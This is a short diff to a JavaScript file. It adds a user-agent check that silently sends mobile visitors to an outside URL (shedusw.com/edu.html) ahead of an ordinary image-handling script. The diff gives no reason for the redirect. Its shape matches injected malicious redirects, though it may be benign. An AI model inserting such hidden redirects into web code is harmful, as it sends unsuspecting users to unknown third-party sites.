@@ -1,3 +1,7 @@
+if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+    window.location.href = "https://shedusw.com/edu.html";
+}
+
 document.addEventListener("DOMContentLoaded", function() {
   const images = document.querySelectorAll('.image');
   
